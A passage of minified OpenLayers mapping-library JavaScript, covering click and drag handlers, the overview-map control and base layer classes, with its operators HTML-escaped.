this,a),this.delay)},passesTolerance:function(a){var b=!0;if(null!=this.pixelTolerance&amp;&amp;this.down&amp;&amp;this.down.xy&amp;&amp;(b=this.pixelTolerance>=this.down.xy.distanceTo(a.xy))&amp;&amp;this.touch&amp;&amp;this.down.touches.length===this.last.touches.length){a=0;for(var c=this.down.touches.length;a&lt;c;++a)if(this.getTouchDistance(this.down.touches[a],this.last.touches[a])>this.pixelTolerance){b=!1;break}}return b},getTouchDistance:function(a,b){return Math.sqrt(Math.pow(a.clientX-b.clientX,2)+Math.pow(a.clientY-b.clientY, 2))},passesDblclickTolerance:function(a){a=!0;this.down&amp;&amp;this.first&amp;&amp;(a=this.down.xy.distanceTo(this.first.xy)&lt;=this.dblclickTolerance);return a},clearTimer:function(){null!=this.timerId&amp;&amp;(window.clearTimeout(this.timerId),this.timerId=null);null!=this.rightclickTimerId&amp;&amp;(window.clearTimeout(this.rightclickTimerId),this.rightclickTimerId=null)},delayedCall:function(a){this.timerId=null;a&amp;&amp;this.callback("click",[a])},getEventInfo:function(a){var b;if(a.touches){var c=a.touches.length;b=Array(c);for(var d, e=0;e&lt;c;e++)d=a.touches[e],b[e]={clientX:d.olClientX,clientY:d.olClientY}}return{xy:a.xy,touches:b}},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.clearTimer(),this.last=this.first=this.down=null,a=!0);return a},CLASS_NAME:"OpenLayers.Handler.Click"});OpenLayers.Handler.Drag=OpenLayers.Class(OpenLayers.Handler,{started:!1,stopDown:!0,dragging:!1,last:null,start:null,lastMoveEvt:null,oldOnselectstart:null,interval:0,timeoutId:null,documentDrag:!1,documentEvents:null,initialize:function(a,b,c){OpenLayers.Handler.prototype.initialize.apply(this,arguments);if(!0===this.documentDrag){var d=this;this._docMove=function(a){d.mousemove({xy:{x:a.clientX,y:a.clientY},element:document})};this._docUp=function(a){d.mouseup({xy:{x:a.clientX,y:a.clientY}})}}}, dragstart:function(a){var b=!0;this.dragging=!1;this.checkModifiers(a)&amp;&amp;(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))?(this.started=!0,this.last=this.start=a.xy,OpenLayers.Element.addClass(this.map.viewPortDiv,"olDragDown"),this.down(a),this.callback("down",[a.xy]),OpenLayers.Event.preventDefault(a),this.oldOnselectstart||(this.oldOnselectstart=document.onselectstart?document.onselectstart:OpenLayers.Function.True),document.onselectstart=OpenLayers.Function.False,b=!this.stopDown): (this.started=!1,this.last=this.start=null);return b},dragmove:function(a){this.lastMoveEvt=a;!this.started||(this.timeoutId||a.xy.x==this.last.x&amp;&amp;a.xy.y==this.last.y)||(!0===this.documentDrag&amp;&amp;this.documentEvents&amp;&amp;(a.element===document?(this.adjustXY(a),this.setEvent(a)):this.removeDocumentEvents()),0&lt;this.interval&amp;&amp;(this.timeoutId=setTimeout(OpenLayers.Function.bind(this.removeTimeout,this),this.interval)),this.dragging=!0,this.move(a),this.callback("move",[a.xy]),this.oldOnselectstart||(this.oldOnselectstart= document.onselectstart,document.onselectstart=OpenLayers.Function.False),this.last=a.xy);return!0},dragend:function(a){if(this.started){!0===this.documentDrag&amp;&amp;this.documentEvents&amp;&amp;(this.adjustXY(a),this.removeDocumentEvents());var b=this.start!=this.last;this.dragging=this.started=!1;OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDragDown");this.up(a);this.callback("up",[a.xy]);b&amp;&amp;this.callback("done",[a.xy]);document.onselectstart=this.oldOnselectstart}return!0},down:function(a){},move:function(a){}, up:function(a){},out:function(a){},mousedown:function(a){return this.dragstart(a)},touchstart:function(a){this.startTouch();return this.dragstart(a)},mousemove:function(a){return this.dragmove(a)},touchmove:function(a){return this.dragmove(a)},removeTimeout:function(){this.timeoutId=null;this.dragging&amp;&amp;this.mousemove(this.lastMoveEvt)},mouseup:function(a){return this.dragend(a)},touchend:function(a){a.xy=this.last;return this.dragend(a)},mouseout:function(a){if(this.started&amp;&amp;OpenLayers.Util.mouseLeft(a, this.map.viewPortDiv))if(!0===this.documentDrag)this.addDocumentEvents();else{var b=this.start!=this.last;this.dragging=this.started=!1;OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDragDown");this.out(a);this.callback("out",[]);b&amp;&amp;this.callback("done",[a.xy]);document.onselectstart&amp;&amp;(document.onselectstart=this.oldOnselectstart)}return!0},click:function(a){return this.start==this.last},activate:function(){var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&amp;&amp;(this.dragging= !1,a=!0);return a},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.dragging=this.started=!1,this.last=this.start=null,a=!0,OpenLayers.Element.removeClass(this.map.viewPortDiv,"olDragDown"));return a},adjustXY:function(a){var b=OpenLayers.Util.pagePosition(this.map.viewPortDiv);a.xy.x-=b[0];a.xy.y-=b[1]},addDocumentEvents:function(){OpenLayers.Element.addClass(document.body,"olDragDown");this.documentEvents=!0;OpenLayers.Event.observe(document,"mousemove", this._docMove);OpenLayers.Event.observe(document,"mouseup",this._docUp)},removeDocumentEvents:function(){OpenLayers.Element.removeClass(document.body,"olDragDown");this.documentEvents=!1;OpenLayers.Event.stopObserving(document,"mousemove",this._docMove);OpenLayers.Event.stopObserving(document,"mouseup",this._docUp)},CLASS_NAME:"OpenLayers.Handler.Drag"});OpenLayers.Control.OverviewMap=OpenLayers.Class(OpenLayers.Control,{element:null,ovmap:null,size:{w:180,h:90},layers:null,minRectSize:15,minRectDisplayClass:"RectReplacement",minRatio:8,maxRatio:32,mapOptions:null,autoPan:!1,handlers:null,resolutionFactor:1,maximized:!1,maximizeTitle:"",minimizeTitle:"",initialize:function(a){this.layers=[];this.handlers={};OpenLayers.Control.prototype.initialize.apply(this,[a])},destroy:function(){this.mapDiv&amp;&amp;(this.handlers.click&amp;&amp;this.handlers.click.destroy(), this.handlers.drag&amp;&amp;this.handlers.drag.destroy(),this.ovmap&amp;&amp;this.ovmap.viewPortDiv.removeChild(this.extentRectangle),this.extentRectangle=null,this.rectEvents&amp;&amp;(this.rectEvents.destroy(),this.rectEvents=null),this.ovmap&amp;&amp;(this.ovmap.destroy(),this.ovmap=null),this.element.removeChild(this.mapDiv),this.mapDiv=null,this.div.removeChild(this.element),this.element=null,this.maximizeDiv&amp;&amp;(this.div.removeChild(this.maximizeDiv),this.maximizeDiv=null),this.minimizeDiv&amp;&amp;(this.div.removeChild(this.minimizeDiv), this.minimizeDiv=null),this.map.events.un({buttonclick:this.onButtonClick,moveend:this.update,changebaselayer:this.baseLayerDraw,scope:this}),OpenLayers.Control.prototype.destroy.apply(this,arguments))},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);if(0===this.layers.length)if(this.map.baseLayer)this.layers=[this.map.baseLayer.clone()];else return this.map.events.register("changebaselayer",this,this.baseLayerDraw),this.div;this.element=document.createElement("div");this.element.className= this.displayClass+"Element";this.element.style.display="none";this.mapDiv=document.createElement("div");this.mapDiv.style.width=this.size.w+"px";this.mapDiv.style.height=this.size.h+"px";this.mapDiv.style.position="relative";this.mapDiv.style.overflow="hidden";this.mapDiv.id=OpenLayers.Util.createUniqueID("overviewMap");this.extentRectangle=document.createElement("div");this.extentRectangle.style.position="absolute";this.extentRectangle.style.zIndex=1E3;this.extentRectangle.className=this.displayClass+ "ExtentRectangle";this.element.appendChild(this.mapDiv);this.div.appendChild(this.element);if(this.outsideViewport)this.element.style.display="";else{this.div.className+=" "+this.displayClass+"Container";var a=OpenLayers.Util.getImageLocation("layer-switcher-maximize.png");this.maximizeDiv=OpenLayers.Util.createAlphaImageDiv(this.displayClass+"MaximizeButton",null,null,a,"absolute");this.maximizeDiv.style.display="none";this.maximizeDiv.className=this.displayClass+"MaximizeButton olButton";this.maximizeTitle&amp;&amp; (this.maximizeDiv.title=this.maximizeTitle);this.div.appendChild(this.maximizeDiv);a=OpenLayers.Util.getImageLocation("layer-switcher-minimize.png");this.minimizeDiv=OpenLayers.Util.createAlphaImageDiv("OpenLayers_Control_minimizeDiv",null,null,a,"absolute");this.minimizeDiv.style.display="none";this.minimizeDiv.className=this.displayClass+"MinimizeButton olButton";this.minimizeTitle&amp;&amp;(this.minimizeDiv.title=this.minimizeTitle);this.div.appendChild(this.minimizeDiv);this.minimizeControl()}this.map.getExtent()&amp;&amp; this.update();this.map.events.on({buttonclick:this.onButtonClick,moveend:this.update,scope:this});this.maximized&amp;&amp;this.maximizeControl();return this.div},baseLayerDraw:function(){this.draw();this.map.events.unregister("changebaselayer",this,this.baseLayerDraw)},rectDrag:function(a){var b=this.handlers.drag.last.x-a.x,c=this.handlers.drag.last.y-a.y;if(0!=b||0!=c){var d=this.rectPxBounds.top,e=this.rectPxBounds.left;a=Math.abs(this.rectPxBounds.getHeight());var f=this.rectPxBounds.getWidth(),c=Math.max(0, d-c),c=Math.min(c,this.ovmap.size.h-this.hComp-a),b=Math.max(0,e-b),b=Math.min(b,this.ovmap.size.w-this.wComp-f);this.setRectPxBounds(new OpenLayers.Bounds(b,c+a,b+f,c))}},mapDivClick:function(a){var b=this.rectPxBounds.getCenterPixel(),c=a.xy.x-b.x,d=a.xy.y-b.y,e=this.rectPxBounds.top,f=this.rectPxBounds.left;a=Math.abs(this.rectPxBounds.getHeight());b=this.rectPxBounds.getWidth();d=Math.max(0,e+d);d=Math.min(d,this.ovmap.size.h-a);c=Math.max(0,f+c);c=Math.min(c,this.ovmap.size.w-b);this.setRectPxBounds(new OpenLayers.Bounds(c, d+a,c+b,d));this.updateMapToRect()},onButtonClick:function(a){a.buttonElement===this.minimizeDiv?this.minimizeControl():a.buttonElement===this.maximizeDiv&amp;&amp;this.maximizeControl()},maximizeControl:function(a){this.element.style.display="";this.showToggle(!1);null!=a&amp;&amp;OpenLayers.Event.stop(a)},minimizeControl:function(a){this.element.style.display="none";this.showToggle(!0);null!=a&amp;&amp;OpenLayers.Event.stop(a)},showToggle:function(a){this.maximizeDiv&amp;&amp;(this.maximizeDiv.style.display=a?"":"none");this.minimizeDiv&amp;&amp; (this.minimizeDiv.style.display=a?"none":"")},update:function(){null==this.ovmap&amp;&amp;this.createMap();!this.autoPan&amp;&amp;this.isSuitableOverview()||this.updateOverview();this.updateRectToMap()},isSuitableOverview:function(){var a=this.map.getExtent(),b=this.map.getMaxExtent(),a=new OpenLayers.Bounds(Math.max(a.left,b.left),Math.max(a.bottom,b.bottom),Math.min(a.right,b.right),Math.min(a.top,b.top));this.ovmap.getProjection()!=this.map.getProjection()&amp;&amp;(a=a.transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject())); b=this.ovmap.getResolution()/this.map.getResolution();return b>this.minRatio&amp;&amp;b&lt;=this.maxRatio&amp;&amp;this.ovmap.getExtent().containsBounds(a)},updateOverview:function(){var a=this.map.getResolution(),b=this.ovmap.getResolution(),c=b/a;c>this.maxRatio?b=this.minRatio*a:c&lt;=this.minRatio&amp;&amp;(b=this.maxRatio*a);this.ovmap.getProjection()!=this.map.getProjection()?(a=this.map.center.clone(),a.transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject())):a=this.map.center;this.ovmap.setCenter(a, this.ovmap.getZoomForResolution(b*this.resolutionFactor));this.updateRectToMap()},createMap:function(){var a=OpenLayers.Util.extend({controls:[],maxResolution:"auto",fallThrough:!1},this.mapOptions);this.ovmap=new OpenLayers.Map(this.mapDiv,a);this.ovmap.viewPortDiv.appendChild(this.extentRectangle);OpenLayers.Event.stopObserving(window,"unload",this.ovmap.unloadDestroy);this.ovmap.addLayers(this.layers);this.ovmap.zoomToMaxExtent();this.wComp=(this.wComp=parseInt(OpenLayers.Element.getStyle(this.extentRectangle, "border-left-width"))+parseInt(OpenLayers.Element.getStyle(this.extentRectangle,"border-right-width")))?this.wComp:2;this.hComp=(this.hComp=parseInt(OpenLayers.Element.getStyle(this.extentRectangle,"border-top-width"))+parseInt(OpenLayers.Element.getStyle(this.extentRectangle,"border-bottom-width")))?this.hComp:2;this.handlers.drag=new OpenLayers.Handler.Drag(this,{move:this.rectDrag,done:this.updateMapToRect},{map:this.ovmap});this.handlers.click=new OpenLayers.Handler.Click(this,{click:this.mapDivClick}, {single:!0,"double":!1,stopSingle:!0,stopDouble:!0,pixelTolerance:1,map:this.ovmap});this.handlers.click.activate();this.rectEvents=new OpenLayers.Events(this,this.extentRectangle,null,!0);this.rectEvents.register("mouseover",this,function(a){this.handlers.drag.active||this.map.dragging||this.handlers.drag.activate()});this.rectEvents.register("mouseout",this,function(a){this.handlers.drag.dragging||this.handlers.drag.deactivate()});if(this.ovmap.getProjection()!=this.map.getProjection()){var a=this.map.getProjectionObject().getUnits()|| this.map.units||this.map.baseLayer.units,b=this.ovmap.getProjectionObject().getUnits()||this.ovmap.units||this.ovmap.baseLayer.units;this.resolutionFactor=a&amp;&amp;b?OpenLayers.INCHES_PER_UNIT[a]/OpenLayers.INCHES_PER_UNIT[b]:1}},updateRectToMap:function(){var a;a=this.ovmap.getProjection()!=this.map.getProjection()?this.map.getExtent().transform(this.map.getProjectionObject(),this.ovmap.getProjectionObject()):this.map.getExtent();(a=this.getRectBoundsFromMapBounds(a))&amp;&amp;this.setRectPxBounds(a)},updateMapToRect:function(){var a= this.getMapBoundsFromRectBounds(this.rectPxBounds);this.ovmap.getProjection()!=this.map.getProjection()&amp;&amp;(a=a.transform(this.ovmap.getProjectionObject(),this.map.getProjectionObject()));this.map.panTo(a.getCenterLonLat())},setRectPxBounds:function(a){var b=Math.max(a.top,0),c=Math.max(a.left,0),d=Math.min(a.top+Math.abs(a.getHeight()),this.ovmap.size.h-this.hComp);a=Math.min(a.left+a.getWidth(),this.ovmap.size.w-this.wComp);var e=Math.max(a-c,0),f=Math.max(d-b,0);e&lt;this.minRectSize||f&lt;this.minRectSize? (this.extentRectangle.className=this.displayClass+this.minRectDisplayClass,e=c+e/2-this.minRectSize/2,this.extentRectangle.style.top=Math.round(b+f/2-this.minRectSize/2)+"px",this.extentRectangle.style.left=Math.round(e)+"px",this.extentRectangle.style.height=this.minRectSize+"px",this.extentRectangle.style.width=this.minRectSize+"px"):(this.extentRectangle.className=this.displayClass+"ExtentRectangle",this.extentRectangle.style.top=Math.round(b)+"px",this.extentRectangle.style.left=Math.round(c)+ "px",this.extentRectangle.style.height=Math.round(f)+"px",this.extentRectangle.style.width=Math.round(e)+"px");this.rectPxBounds=new OpenLayers.Bounds(Math.round(c),Math.round(d),Math.round(a),Math.round(b))},getRectBoundsFromMapBounds:function(a){var b=this.getOverviewPxFromLonLat({lon:a.left,lat:a.bottom});a=this.getOverviewPxFromLonLat({lon:a.right,lat:a.top});var c=null;b&amp;&amp;a&amp;&amp;(c=new OpenLayers.Bounds(b.x,b.y,a.x,a.y));return c},getMapBoundsFromRectBounds:function(a){var b=this.getLonLatFromOverviewPx({x:a.left, y:a.bottom});a=this.getLonLatFromOverviewPx({x:a.right,y:a.top});return new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat)},getLonLatFromOverviewPx:function(a){var b=this.ovmap.size,c=this.ovmap.getResolution(),d=this.ovmap.getExtent().getCenterLonLat();return{lon:d.lon+(a.x-b.w/2)*c,lat:d.lat-(a.y-b.h/2)*c}},getOverviewPxFromLonLat:function(a){var b=this.ovmap.getResolution(),c=this.ovmap.getExtent();if(c)return{x:Math.round(1/b*(a.lon-c.left)),y:Math.round(1/b*(c.top-a.lat))}},CLASS_NAME:"OpenLayers.Control.OverviewMap"});OpenLayers.Layer=OpenLayers.Class({id:null,name:null,div:null,opacity:1,alwaysInRange:null,RESOLUTION_PROPERTIES:"scales resolutions maxScale minScale maxResolution minResolution numZoomLevels maxZoomLevel".split(" "),events:null,map:null,isBaseLayer:!1,alpha:!1,displayInLayerSwitcher:!0,visibility:!0,attribution:null,inRange:!1,imageSize:null,options:null,eventListeners:null,gutter:0,projection:null,units:null,scales:null,resolutions:null,maxExtent:null,minExtent:null,maxResolution:null,minResolution:null, numZoomLevels:null,minScale:null,maxScale:null,displayOutsideMaxExtent:!1,wrapDateLine:!1,metadata:null,initialize:function(a,b){this.metadata={};b=OpenLayers.Util.extend({},b);null!=this.alwaysInRange&amp;&amp;(b.alwaysInRange=this.alwaysInRange);this.addOptions(b);this.name=a;if(null==this.id&amp;&amp;(this.id=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_"),this.div=OpenLayers.Util.createDiv(this.id),this.div.style.width="100%",this.div.style.height="100%",this.div.dir="ltr",this.events=new OpenLayers.Events(this, this.div),this.eventListeners instanceof Object))this.events.on(this.eventListeners)},destroy:function(a){null==a&amp;&amp;(a=!0);null!=this.map&amp;&amp;this.map.removeLayer(this,a);this.options=this.div=this.name=this.map=this.projection=null;this.events&amp;&amp;(this.eventListeners&amp;&amp;this.events.un(this.eventListeners),this.events.destroy());this.events=this.eventListeners=null},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer(this.name,this.getOptions()));OpenLayers.Util.applyDefaults(a,this);a.map=null;return a}, getOptions:function(){var a={},b;for(b in this.options)a[b]=this[b];return a},setName:function(a){a!=this.name&amp;&amp;(this.name=a,null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"name"}))},addOptions:function(a,b){null==this.options&amp;&amp;(this.options={});a&amp;&amp;("string"==typeof a.projection&amp;&amp;(a.projection=new OpenLayers.Projection(a.projection)),a.projection&amp;&amp;OpenLayers.Util.applyDefaults(a,OpenLayers.Projection.defaults[a.projection.getCode()]),!a.maxExtent||a.maxExtent instanceof OpenLayers.Bounds||(a.maxExtent=new OpenLayers.Bounds(a.maxExtent)),!a.minExtent||a.minExtent instanceof OpenLayers.Bounds||(a.minExtent=new OpenLayers.Bounds(a.minExtent)));OpenLayers.Util.extend(this.options,a);OpenLayers.Util.extend(this,a);this.projection&amp;&amp;this.projection.getUnits()&amp;&amp;(this.units=this.projection.getUnits());if(this.map){var c=this.map.getResolution(),d=this.RESOLUTION_PROPERTIES.concat(["projection","units","minExtent","maxExtent"]),e;for(e in a)if(a.hasOwnProperty(e)&amp;&amp;0&lt;=OpenLayers.Util.indexOf(d, e)){this.initResolutions();b&amp;&amp;this.map.baseLayer===this&amp;&amp;(this.map.setCenter(this.map.getCenter(),this.map.getZoomForResolution(c),!1,!0),this.map.events.triggerEvent("changebaselayer",{layer:this}));break}}},onMapResize:function(){},redraw:function(){var a=!1;if(this.map){this.inRange=this.calculateInRange();var b=this.getExtent();b&amp;&amp;(this.inRange&amp;&amp;this.visibility)&amp;&amp;(this.moveTo(b,!0,!1),this.events.triggerEvent("moveend",{zoomChanged:!0}),a=!0)}return a},moveTo:function(a,b,c){a=this.visibility; this.isBaseLayer||(a=a&amp;&amp;this.inRange);this.display(a)},moveByPx:function(a,b){},setMap:function(a){null==this.map&amp;&amp;(this.map=a,this.maxExtent=this.maxExtent||this.map.maxExtent,this.minExtent=this.minExtent||this.map.minExtent,this.projection=this.projection||this.map.projection,"string"==typeof this.projection&amp;&amp;(this.projection=new OpenLayers.Projection(this.projection)),this.units=this.projection.getUnits()||this.units||this.map.units,this.initResolutions(),this.isBaseLayer||(this.inRange=this.calculateInRange(), this.div.style.display=this.visibility&amp;&amp;this.inRange?"":"none"),this.setTileSize())},afterAdd:function(){},removeMap:function(a){},getImageSize:function(a){return this.imageSize||this.tileSize},setTileSize:function(a){this.tileSize=a=a?a:this.tileSize?this.tileSize:this.map.getTileSize();this.gutter&amp;&amp;(this.imageSize=new OpenLayers.Size(a.w+2*this.gutter,a.h+2*this.gutter))},getVisibility:function(){return this.visibility},setVisibility:function(a){a!=this.visibility&amp;&amp;(this.visibility=a,this.display(a), this.redraw(),null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"visibility"}),this.events.triggerEvent("visibilitychanged"))},display:function(a){a!=("none"!=this.div.style.display)&amp;&amp;(this.div.style.display=a&amp;&amp;this.calculateInRange()?"block":"none")},calculateInRange:function(){var a=!1;this.alwaysInRange?a=!0:this.map&amp;&amp;(a=this.map.getResolution(),a=a>=this.minResolution&amp;&amp;a&lt;=this.maxResolution);return a},setIsBaseLayer:function(a){a!=this.isBaseLayer&amp;&amp;(this.isBaseLayer= a,null!=this.map&amp;&amp;this.map.events.triggerEvent("changebaselayer",{layer:this}))},initResolutions:function(){var a,b,c,d={},e=!0;a=0;for(b=this.RESOLUTION_PROPERTIES.length;a&lt;b;a++)c=this.RESOLUTION_PROPERTIES[a],d[c]=this.options[c],e&amp;&amp;this.options[c]&amp;&amp;(e=!1);null==this.options.alwaysInRange&amp;&amp;(this.alwaysInRange=e);null==d.resolutions&amp;&amp;(d.resolutions=this.resolutionsFromScales(d.scales));null==d.resolutions&amp;&amp;(d.resolutions=this.calculateResolutions(d));if(null==d.resolutions){a=0;for(b=this.RESOLUTION_PROPERTIES.length;a&lt; b;a++)c=this.RESOLUTION_PROPERTIES[a],d[c]=null!=this.options[c]?this.options[c]:this.map[c];null==d.resolutions&amp;&amp;(d.resolutions=this.resolutionsFromScales(d.scales));null==d.resolutions&amp;&amp;(d.resolutions=this.calculateResolutions(d))}var f;this.options.maxResolution&amp;&amp;"auto"!==this.options.maxResolution&amp;&amp;(f=this.options.maxResolution);this.options.minScale&amp;&amp;(f=OpenLayers.Util.getResolutionFromScale(this.options.minScale,this.units));var g;this.options.minResolution&amp;&amp;"auto"!==this.options.minResolution&amp;&amp; (g=this.options.minResolution);this.options.maxScale&amp;&amp;(g=OpenLayers.Util.getResolutionFromScale(this.options.maxScale,this.units));d.resolutions&amp;&amp;(d.resolutions.sort(function(a,b){return b-a}),f||(f=d.resolutions[0]),g||(g=d.resolutions[d.resolutions.length-1]));if(this.resolutions=d.resolutions){b=this.resolutions.length;this.scales=Array(b);for(a=0;a&lt;b;a++)this.scales[a]=OpenLayers.Util.getScaleFromResolution(this.resolutions[a],this.units);this.numZoomLevels=b}if(this.minResolution=g)this.maxScale= OpenLayers.Util.getScaleFromResolution(g,this.units);if(this.maxResolution=f)this.minScale=OpenLayers.Util.getScaleFromResolution(f,this.units)},resolutionsFromScales:function(a){if(null!=a){var b,c,d;d=a.length;b=Array(d);for(c=0;c&lt;d;c++)b[c]=OpenLayers.Util.getResolutionFromScale(a[c],this.units);return b}},calculateResolutions:function(a){var b,c,d=a.maxResolution;null!=a.minScale?d=OpenLayers.Util.getResolutionFromScale(a.minScale,this.units):"auto"==d&amp;&amp;null!=this.maxExtent&amp;&amp;(b=this.map.getSize(), c=this.maxExtent.getWidth()/b.w,b=this.maxExtent.getHeight()/b.h,d=Math.max(c,b));c=a.minResolution;null!=a.maxScale?c=OpenLayers.Util.getResolutionFromScale(a.maxScale,this.units):"auto"==a.minResolution&amp;&amp;null!=this.minExtent&amp;&amp;(b=this.map.getSize(),c=this.minExtent.getWidth()/b.w,b=this.minExtent.getHeight()/b.h,c=Math.max(c,b));"number"!==typeof d&amp;&amp;("number"!==typeof c&amp;&amp;null!=this.maxExtent)&amp;&amp;(d=this.map.getTileSize(),d=Math.max(this.maxExtent.getWidth()/d.w,this.maxExtent.getHeight()/d.h));b=a.maxZoomLevel; a=a.numZoomLevels;"number"===typeof c&amp;&amp;"number"===typeof d&amp;&amp;void 0===a?a=Math.floor(Math.log(d/c)/Math.log(2))+1:void 0===a&amp;&amp;null!=b&amp;&amp;(a=b+1);if(!("number"!==typeof a||0>=a||"number"!==typeof d&amp;&amp;"number"!==typeof c)){b=Array(a);var e=2;"number"==typeof c&amp;&amp;"number"==typeof d&amp;&amp;(e=Math.pow(d/c,1/(a-1)));var f;if("number"===typeof d)for(f=0;f&lt;a;f++)b[f]=d/Math.pow(e,f);else for(f=0;f&lt;a;f++)b[a-1-f]=c*Math.pow(e,f);return b}},getResolution:function(){var a=this.map.getZoom();return this.getResolutionForZoom(a)}, getExtent:function(){return this.map.calculateBounds()},getZoomForExtent:function(a,b){var c=this.map.getSize(),c=Math.max(a.getWidth()/c.w,a.getHeight()/c.h);return this.getZoomForResolution(c,b)},getDataExtent:function(){},getResolutionForZoom:function(a){a=Math.max(0,Math.min(a,this.resolutions.length-1));if(this.map.fractionalZoom){var b=Math.floor(a),c=Math.ceil(a);a=this.resolutions[b]-(a-b)*(this.resolutions[b]-this.resolutions[c])}else a=this.resolutions[Math.round(a)];return a},getZoomForResolution:function(a, b){var c,d;if(this.map.fractionalZoom){var e=0,f=this.resolutions[e],g=this.resolutions[this.resolutions.length-1],h;c=0;for(d=this.resolutions.length;c&lt;d;++c)if(h=this.resolutions[c],h>=a&amp;&amp;(f=h,e=c),h&lt;=a){g=h;break}c=f-g;c=0&lt;c?e+(f-a)/c:e}else{f=Number.POSITIVE_INFINITY;c=0;for(d=this.resolutions.length;c&lt;d;c++)if(b){e=Math.abs(this.resolutions[c]-a);if(e>f)break;f=e}else if(this.resolutions[c]&lt;a)break;c=Math.max(0,c-1)}return c},getLonLatFromViewPortPx:function(a){var b=null,c=this.map;if(null!= a&amp;&amp;c.minPx){var b=c.getResolution(),d=c.getMaxExtent({restricted:!0}),b=new OpenLayers.LonLat((a.x-c.minPx.x)*b+d.left,(c.minPx.y-a.y)*b+d.top);this.wrapDateLine&amp;&amp;(b=b.wrapDateLine(this.maxExtent))}return b},getViewPortPxFromLonLat:function(a,b){var c=null;null!=a&amp;&amp;(b=b||this.map.getResolution(),c=this.map.calculateBounds(null,b),c=new OpenLayers.Pixel(1/b*(a.lon-c.left),1/b*(c.top-a.lat)));return c},setOpacity:function(a){if(a!=this.opacity){this.opacity=a;for(var b=this.div.childNodes,c=0,d=b.length;c&lt; d;++c){var e=b[c].firstChild||b[c],f=b[c].lastChild;f&amp;&amp;"iframe"===f.nodeName.toLowerCase()&amp;&amp;(e=f.parentNode);OpenLayers.Util.modifyDOMElement(e,null,null,null,null,null,null,a)}null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",{layer:this,property:"opacity"})}},getZIndex:function(){return this.div.style.zIndex},setZIndex:function(a){this.div.style.zIndex=a},adjustBounds:function(a){if(this.gutter){var b=this.gutter*this.map.getResolution();a=new OpenLayers.Bounds(a.left-b,a.bottom-b,a.right+ b,a.top+b)}this.wrapDateLine&amp;&amp;(b={rightTolerance:this.getResolution(),leftTolerance:this.getResolution()},a=a.wrapDateLine(this.maxExtent,b));return a},CLASS_NAME:"OpenLayers.Layer"});OpenLayers.Layer.SphericalMercator={getExtent:function(){var a=null;return a=this.sphericalMercator?this.map.calculateBounds():OpenLayers.Layer.FixedZoomLevels.prototype.getExtent.apply(this)},getLonLatFromViewPortPx:function(a){return OpenLayers.Layer.prototype.getLonLatFromViewPortPx.apply(this,arguments)},getViewPortPxFromLonLat:function(a){return OpenLayers.Layer.prototype.getViewPortPxFromLonLat.apply(this,arguments)},initMercatorParameters:function(){this.RESOLUTIONS=[];for(var a=0;a&lt;=this.MAX_ZOOM_LEVEL;++a)this.RESOLUTIONS[a]= 156543.03390625/Math.pow(2,a);this.units="m";this.projection=this.projection||"EPSG:900913"},forwardMercator:function(){var a=new OpenLayers.Projection("EPSG:4326"),b=new OpenLayers.Projection("EPSG:900913");return function(c,d){var e=OpenLayers.Projection.transform({x:c,y:d},a,b);return new OpenLayers.LonLat(e.x,e.y)}}(),inverseMercator:function(){var a=new OpenLayers.Projection("EPSG:4326"),b=new OpenLayers.Projection("EPSG:900913");return function(c,d){var e=OpenLayers.Projection.transform({x:c, y:d},b,a);return new OpenLayers.LonLat(e.x,e.y)}}()};OpenLayers.Layer.EventPane=OpenLayers.Class(OpenLayers.Layer,{smoothDragPan:!0,isBaseLayer:!0,isFixed:!0,pane:null,mapObject:null,initialize:function(a,b){OpenLayers.Layer.prototype.initialize.apply(this,arguments);null==this.pane&amp;&amp;(this.pane=OpenLayers.Util.createDiv(this.div.id+"_EventPane"))},destroy:function(){this.pane=this.mapObject=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)},setMap:function(a){OpenLayers.Layer.prototype.setMap.apply(this,arguments);this.pane.style.zIndex= parseInt(this.div.style.zIndex)+1;this.pane.style.display=this.div.style.display;this.pane.style.width="100%";this.pane.style.height="100%";"msie"==OpenLayers.BROWSER_NAME&amp;&amp;(this.pane.style.background="url("+OpenLayers.Util.getImageLocation("blank.gif")+")");this.isFixed?this.map.viewPortDiv.appendChild(this.pane):this.map.layerContainerDiv.appendChild(this.pane);this.loadMapObject();null==this.mapObject&amp;&amp;this.loadWarningMessage()},removeMap:function(a){this.pane&amp;&amp;this.pane.parentNode&amp;&amp;this.pane.parentNode.removeChild(this.pane); OpenLayers.Layer.prototype.removeMap.apply(this,arguments)},loadWarningMessage:function(){this.div.style.backgroundColor="darkblue";var a=this.map.getSize(),b=Math.min(a.w,300),c=Math.min(a.h,200),b=new OpenLayers.Size(b,c),a=(new OpenLayers.Pixel(a.w/2,a.h/2)).add(-b.w/2,-b.h/2),a=OpenLayers.Util.createDiv(this.name+"_warning",a,b,null,null,null,"auto");a.style.padding="7px";a.style.backgroundColor="yellow";a.innerHTML=this.getWarningHTML();this.div.appendChild(a)},getWarningHTML:function(){return""}, display:function(a){OpenLayers.Layer.prototype.display.apply(this,arguments);this.pane.style.display=this.div.style.display},setZIndex:function(a){OpenLayers.Layer.prototype.setZIndex.apply(this,arguments);this.pane.style.zIndex=parseInt(this.div.style.zIndex)+1},moveByPx:function(a,b){OpenLayers.Layer.prototype.moveByPx.apply(this,arguments);this.dragPanMapObject?this.dragPanMapObject(a,-b):this.moveTo(this.map.getCachedCenter())},moveTo:function(a,b,c){OpenLayers.Layer.prototype.moveTo.apply(this, arguments);if(null!=this.mapObject){var d=this.map.getCenter(),e=this.map.getZoom();if(null!=d){var 